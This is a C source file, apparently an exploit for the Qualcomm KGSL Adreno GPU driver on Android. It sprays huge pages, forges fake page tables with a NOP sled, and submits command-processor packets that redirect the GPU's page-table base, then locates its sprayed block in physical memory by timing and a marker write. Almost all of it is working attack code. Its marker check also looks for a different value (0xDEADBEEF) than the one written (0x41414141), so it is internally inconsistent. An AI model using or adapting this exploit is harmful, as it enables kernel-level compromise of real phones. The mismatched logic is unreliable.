/* kgsl_ttbr3.c — TTBR0 战役 v5: 取指区域 NOP 雪橇 + 自跳转挂起判别
 * 核心修正(v4 教训): 切换后 CP 的预取/fetch 必须落在 NOP 上, 否则 garbage 指令
 *   (type1 等) 直接 CP error 杀死批次 —— 这是此前所有 marker 扫描零命中的根因。
 * 设计(候选块内 6 页, 全部块填同一 B):
 *   pg0@B+0x0000: [0]=[1]=[0x100]=(B+0x1000)|3   (L0[0]/L1[1]/L1[0x100] → pg1)
 *   pg1@B+0x1000: [0]=[0x100]=(B+0x3000)|3 (fetch 区)  [1]=[2]=(B+0x2000)|3 (marker 区)
 *   pg3@B+0x3000: [0]=(B+0x4000)|3 (start-L0), [1..]=(B+0x5000)|leaf (start-L1 → 雪橇)
 *   pg4@B+0x4000: [i]=(B+0x5000)|leaf (start-L0 的 L3 → 雪橇)
 *   pg5@B+0x5000: NOP 雪橇(type2 0x80000000) + [32..35]=MEM_WRITE{0x400001090,0,0x41414141}
 *                 + [500..503]=CIB 自跳转 → VA 0x4000001000 (无限循环)
 *   叶子: VA 0x4000001000-1FFF → phys B+0x5000 (雪橇); VA 0x400001090 → 雪橇+0x90 (marker 落点)
 * 探测: {0xD3{B} + CIB → VA 0x4000001000, count=500}
 *   walk 成功 → NOP 循环挂起 → kgsl ~2s 超时 (SLOW = HIT)
 *   walk 失败 → 取指 fault → 快速恢复 (~25ms = MISS)
 * 命中后: 扫各块 page5+0x90 找 0x41414141 → 定位块。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define BLOCK_SZ 0x200000UL
#define NBLOCKS 64

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint32_t ctx;
static uint8_t *blk[NBLOCKS];

static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}
static uint64_t wait_ts(uint32_t ts, uint32_t timeout_ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { ctx, ts, timeout_ms };
    double t0 = now_s();
    ioctl(fd, _IOWR(0x09, 0x07, char[12]), &w);
    return (uint64_t)((now_s() - t0) * 1000);
}

static long thp_bytes_of(void *p) {
    FILE *f = fopen("/proc/self/smaps", "r");
    if (!f) return -1;
    char line[256];
    uintptr_t target = (uintptr_t)p;
    int in = 0; long thp = -1;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) { in = (target >= lo && target < hi); if (in) thp = 0; }
        else if (in && !strncmp(line, "AnonHugePages:", 14)) sscanf(line + 14, "%ld", &thp);
    }
    fclose(f);
    return thp;
}

static int spray(void) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint8_t *raw = mmap(NULL, BLOCK_SZ * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (raw == MAP_FAILED) return 1;
        uint8_t *base = (uint8_t*)(((uintptr_t)raw + BLOCK_SZ - 1) & ~(BLOCK_SZ - 1));
        madvise(base, BLOCK_SZ, MADV_HUGEPAGE);
        memset(base, 0, BLOCK_SZ);
        blk[j] = base;
    }
    int ok = 0;
    for (int j = 0; j < NBLOCKS; j++)
        if (thp_bytes_of(blk[j]) >= (long)BLOCK_SZ / 1024) ok++;
    printf("[spray] THP %d/%d\n", ok, NBLOCKS);
    return ok == NBLOCKS ? 0 : 1;
}

/* 填充候选块 j 的 6 页(B = 候选物理基, attr = MemAttr 索引) */
static void fill_fake(uint64_t B, uint8_t *jv, int attr) {
    uint64_t *pg0 = (uint64_t*)jv;
    uint64_t *pg1 = (uint64_t*)(jv + 0x1000);
    uint64_t *pg3 = (uint64_t*)(jv + 0x3000);
    uint64_t *pg4 = (uint64_t*)(jv + 0x4000);
    uint64_t *pg5 = (uint64_t*)(jv + 0x5000);
    uint64_t laf = 0x1 | (1 << 6) | (((uint64_t)attr) << 2) | (2 << 8) | (1 << 10) | (1 << 11);
    memset(jv, 0, 0x6000);
    pg0[0] = (B + 0x1000) | 3;       /* L0[0] → pg1 */
    pg0[1] = (B + 0x1000) | 3;       /* L1[1] → pg1 */
    pg0[0x100] = (B + 0x1000) | 3;   /* L1[0x100] → pg1 */
    pg1[0] = (B + 0x3000) | 3;       /* L2[0] (start-L1 fetch) → pg3 */
    pg1[0x100] = (B + 0x3000) | 3;   /* start-L0 L1[0x100] → pg3 */
    pg1[1] = (B + 0x2000) | 3;       /* start-L0 L1[1] → pg2 */
    pg1[2] = (B + 0x2000) | 3;       /* start-L1 L2[2] → pg2 */
    /* pg3: start-L1 L3: [1..] → 雪橇; start-L0 L2: [0] → pg4 */
    pg3[0] = (B + 0x4000) | 3;
    for (int i = 1; i < 512; i++) pg3[i] = (B + 0x5000) | laf;
    /* pg4: start-L0 L3: [i] → 雪橇 */
    for (int i = 0; i < 512; i++) pg4[i] = (B + 0x5000) | laf;
    /* pg5: NOP 雪橇 */
    for (int i = 0; i < 512; i++) pg5[i] = 0x80000000u;
    pg5[32] = 0x703D8003;            /* CP_MEM_WRITE count=3 */
    pg5[33] = 0x400001090ull & 0xFFFFFFFF;
    pg5[34] = 0x00000040;
    pg5[35] = 0x41414141;            /* marker → VA 0x400001090 → phys B+0x5090 */
    pg5[500] = 0x703F0003;           /* CP_INDIRECT_BUFFER count=3 */
    pg5[501] = 0x00001000;           /* VA lo → 0x4000001000 */
    pg5[502] = 0x00000040;           /* VA hi */
    pg5[503] = 0x000001F4;           /* count = 500 → 无限循环 */
    cache_op(jv, jv + 0x6000, 0);
}

static void sweep(uint64_t start, uint64_t count) {
    if (spray()) { printf("spray fail\n"); return; }
    ctx_create();
    uint32_t ts = 0;
    double t0 = now_s();
    for (uint64_t k = 0; k < count; k++) {
        uint64_t B = start + k * BLOCK_SZ;
        for (int j = 0; j < NBLOCKS; j++)
            fill_fake(B, blk[j], j % 8);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B); *c++ = upper_32_bits(B);
        *c++ = 0; *c++ = 0;
        *c++ = cp_type7_packet(0x3f, 3);           /* CP_INDIRECT_BUFFER */
        *c++ = 0x00001000; *c++ = 0x00000040;      /* VA 0x4000001000 */
        *c++ = 0x000001F8;                          /* 504 dwords (含自跳转) */
        uint32_t dw = (uint32_t)(c - ib);
        cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
        ts++;
        int r = gpu_command(ib_ga, dw * 4);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
        uint64_t ms = wait_ts(ts, 6000);
        /* 互斥验证: 只查精确落点 page5+0x90 (0x5090), 排除指令立即数(0x508C) */
        int hitb = -1; uint64_t hitoff = 0;
        for (int j = 0; j < NBLOCKS && hitb < 0; j++) {
            cache_op(blk[j] + 0x5090, blk[j] + 0x5094, 1);
            if (*(uint32_t*)(blk[j] + 0x5090) == 0xDEADBEEFu) { hitb = j; hitoff = 0x5090; }
        }
        if (k % 16 == 0)
            printf("  [%7.1fs] %llu/%llu B=0x%llx %llums hit=%d/%llx\n",
                   now_s() - t0, (unsigned long long)k + 1, (unsigned long long)count,
                   (unsigned long long)B, (unsigned long long)ms, hitb, (unsigned long long)hitoff);
        if (hitb >= 0) {
            printf("\n*** HIT: B = 0x%llx (挂起 %llums) 块=%d 偏移=0x%llx ***\n",
                   (unsigned long long)B, (unsigned long long)ms, hitb, (unsigned long long)hitoff);
            FILE *f = fopen("/data/local/tmp/ttbr_hit.txt", "w");
            if (f) { fprintf(f, "B=0x%llx block=%d va=%p off=0x%llx\n",
                             (unsigned long long)B, hitb, hitb >= 0 ? blk[hitb] : NULL,
                             (unsigned long long)hitoff); fclose(f); }
            /* dump 落点周边: page5 全部 + 前后文 */
            uint8_t *jb = blk[hitb];
            for (uint64_t o = 0x5000; o < 0x5400; o += 16) {
                printf("  %04llx:", (unsigned long long)o);
                for (int b = 0; b < 16; b++) printf(" %02x", jb[o + b]);
                printf("\n");
            }
            return;
        }
        ctx_recreate();
    }
    printf("范围无命中 (%.1fs)\n", now_s() - t0);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); return 1; }
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) { printf("map fail\n"); return 1; }
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    uint64_t start = argc > 1 ? strtoull(argv[1], NULL, 0) : 0x40000000ull;
    uint64_t count = argc > 2 ? strtoull(argv[2], NULL, 0) : 7168;
    sweep(start, count);
    printf("done alive\n");
    return 0;
}
